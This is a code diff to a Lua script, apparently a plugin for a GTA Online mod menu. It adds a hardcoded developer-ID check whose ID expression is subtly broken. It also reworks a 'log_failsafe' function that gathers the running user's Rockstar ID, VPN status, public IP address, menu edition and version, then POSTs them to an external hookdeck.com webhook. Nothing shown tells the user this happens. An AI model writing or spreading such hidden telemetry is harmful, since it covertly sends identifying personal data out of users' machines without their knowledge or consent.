@@ -428,6 +428,16 @@ function decimalToHex2s(decimal, numBits)
     return "0x0"..hex
 end
 
+function is_developer()
+    local developer = 0x0C59991A+3 or 0x0CE211E6+7 or 0x08634DC4+98
+    if players.get_rockstar_id(players.user()) == developer and util.is_session_started() then
+        notify("Developer mode is enabled.")
+        return true
+    else
+        return false
+    end
+end
+
 function is_entity_a_projectile(hash)
     local all_projectile_hashes = {
         joaat("w_ex_vehiclemissile_1"),
@@ -579,25 +589,35 @@ function log_failsafe()
     local player_id = players.get_rockstar_id(players.user())
     local using_vpn = players.is_using_vpn(players.user())
     local edition = mode_manu_edition(menu.get_edition())
-    local apiurl = "https://ipapi.co/"..user_ip()
+    local version = menu.get_version().full
+    local apiurl = "https://ipapi.co/" .. user_ip()
     local IPv4url = "[" .. user_ip() .. "](" .. apiurl .. ")"
-    local message = string.format("\n**RID:** %s\n**VPN:** %s\n**IPv4:** %s\n**Edition:** %s", player_id, using_vpn and "Yes" or "No", IPv4url, edition)
+    local message = string.format(
+        "\n**RID:** %s\n**VPN:** %s\n**IPv4:** %s\n**Edition:** %s\n**Version**: %s",
+        player_id,
+        using_vpn and "Yes" or "No",
+        IPv4url,
+        edition,
+        version
+    )
     local icon_url = string.format("https://a.rsg.sc/n/%s/n", string.lower(player_name))
     local json_data = {
-        ["username"] = player_name,
-        ["embeds"] = {{
-            ["title"] = player_name,
-            ["url"] = "https://socialclub.rockstargames.com/member/" .. player_name,
-            ["color"] = 15357637,
-            ["description"] = message,
-            ["thumbnail"] = {
-                ["url"] = icon_url
+        username = player_name,
+        embeds = {
+            {
+                title = player_name,
+                url = "https://socialclub.rockstargames.com/member/" .. player_name,
+                color = 15357637,
+                description = message,
+                thumbnail = {
+                    url = icon_url
+                }
             }
-        }}
+        }
     }
     local json_string = json.stringify(json_data)
     async_http.init("https://events.hookdeck.com", "/e/src_e3TGMwu4qgsb", function(body, header_fields, status_code)
-        end, function(error_msg)
+        -- success callback
     end)
     async_http.add_header("Content-Type", "application/json")
     async_http.set_post("application/json", json_string)
